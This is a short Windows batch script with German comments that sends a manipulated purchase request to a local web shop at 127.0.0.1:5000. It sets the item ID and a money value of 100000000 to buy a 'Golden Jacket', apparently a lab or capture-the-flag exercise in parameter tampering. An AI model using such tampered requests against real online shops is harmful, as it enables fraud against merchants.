@echo off
setlocal

echo [+] Sende manipulierten Verkaufs-Request fuer die Golden Jacket (ID: 3)...

rem In Windows CMD muessen wir die Parameter ganz normal in Anfuehrungszeichen setzen
curl -s -X POST -d "id=3&money=100000000" http://127.0.0.1:5000/buy

echo.
echo ----------------------------------------
echo [+] Request abgeschlossen.
echo ----------------------------------------
pause